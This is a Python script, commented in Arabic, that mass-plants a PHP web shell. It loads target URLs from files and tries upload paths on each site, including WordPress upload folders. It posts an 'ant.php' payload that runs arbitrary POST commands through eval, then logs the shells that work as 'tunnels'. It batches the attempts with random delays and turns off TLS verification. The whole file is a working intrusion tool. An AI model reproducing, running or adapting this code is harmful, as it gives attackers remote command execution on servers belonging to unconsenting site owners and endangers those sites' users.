import asyncio, httpx, os, time, random
from bs4 import BeautifulSoup

TARGETS_FILE = "targets.txt"
HARVEST_LOG = "titan_harvest.log"
SECURE_TUNNELS = "codehub_tunnels.log"
ANT_PAYLOAD = "<?php echo 'CodeHub_Ant_Active'; @eval($_POST['cmd']); ?>"

async def plant_and_secure(client, url):
    if not url.startswith('http'): url = 'https://' + url
    print(f"[🔎] Scouting: {url}...") # راديو الميدان: بداية الفحص
    try:
        res = await client.get(url, timeout=10, follow_redirects=True)
        is_wp = "wp-content" in res.text
        
        paths = ["/wp-content/uploads/", "/tmp/", "/images/"] if is_wp else ["/upload/", "/assets/"]
        
        for p in paths:
            t_path = url.rstrip('/') + p + "ant.php"
            # محاولة الزرع
            try:
                await client.post(url.rstrip('/') + p, files={'file': ('ant.php', ANT_PAYLOAD)}, timeout=5)
                chk = await client.get(t_path, timeout=5)
                if "CodeHub_Ant_Active" in chk.text:
                    print(f"\n[🔥] SUCCESS! TUNNEL SECURED: {t_path}\a") # \a بتعمل صوت Beep في Termux
                    with open(SECURE_TUNNELS, "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {t_path}\n")
                    return True
            except:
                continue
        
        print(f"[🔕] No opening found at: {url}") # راديو الميدان: فشل المحاولة
    except Exception as e:
        print(f"[❌] Target Shielded: {url}")

async def main():
    links = set()
    for f_name in [TARGETS_FILE, HARVEST_LOG]:
        if os.path.exists(f_name):
            with open(f_name, "r") as f:
                for line in f:
                    if "http" in line:
                        # استخراج الرابط بدقة
                        parts = line.replace('|',' ').split()
                        link = [w for w in parts if "http" in w][0].strip().strip(',')
                        links.add(link)

    links_list = list(links)
    print(f"[🛡️] CodeHub Battle Map: {len(links_list)} Targets Loaded.")
    
    async with httpx.AsyncClient(verify=False, http2=True) as client:
        for i in range(0, len(links_list), 5): # صغرنا الموجة لـ 5 عشان تشوف الرسايل أسرع
            batch = links_list[i:i+5]
            await asyncio.gather(*[plant_and_secure(client, u) for u in batch])
            await asyncio.sleep(random.uniform(2, 4))

if __name__ == "__main__":
    asyncio.run(main())
